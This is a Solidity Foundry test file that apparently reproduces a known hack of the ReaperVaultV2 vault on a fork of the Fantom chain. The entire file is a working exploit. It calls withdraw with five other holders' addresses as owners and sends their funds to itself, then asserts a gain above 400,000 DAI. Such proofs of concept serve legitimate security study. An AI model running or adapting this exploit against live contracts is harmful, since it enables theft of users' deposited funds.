// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/ReaperVaultV2.sol";

interface IERC20Like {
    function balanceOf(address _addr) external view returns (uint);
}

contract CounterTest is Test {
    ReaperVaultV2 reaper = ReaperVaultV2(0x77dc33dC0278d21398cb9b16CbFf99c1B712a87A);
    IERC20Like fantomDai = IERC20Like(0x8D11eC38a3EB5E956B052f67Da8Bdc9bef8Abf3E);

    function testReaperHack() public {
        vm.createSelectFork(vm.envString("FANTOM_RPC"), 44000000);
        console.log("Your Starting Balance:", fantomDai.balanceOf(address(this)));
        
        reaper.withdraw(reaper.maxWithdraw(0xEB7a12fE169C98748EB20CE8286EAcCF4876643b), address(this), 0xEB7a12fE169C98748EB20CE8286EAcCF4876643b);
        reaper.withdraw(reaper.maxWithdraw(0x056abd53a55C187d738B4A982D36b4dFa506326A), address(this), 0x056abd53a55C187d738B4A982D36b4dFa506326A);
        reaper.withdraw(reaper.maxWithdraw(0x954773dD09a0bd708D3C03A62FB0947e8078fCf9), address(this), 0x954773dD09a0bd708D3C03A62FB0947e8078fCf9);
        reaper.withdraw(reaper.maxWithdraw(0xB573f01f2901c0dB3E14Ec80C6E12e4868DEC864), address(this), 0xB573f01f2901c0dB3E14Ec80C6E12e4868DEC864);
        reaper.withdraw(reaper.maxWithdraw(0xfc83DA727034a487f031dA33D55b4664ba312f1D), address(this), 0xfc83DA727034a487f031dA33D55b4664ba312f1D);

        console.log("Your Final Balance:", fantomDai.balanceOf(address(this)));
        assert(fantomDai.balanceOf(address(this)) > 400_000 ether);
    }
}
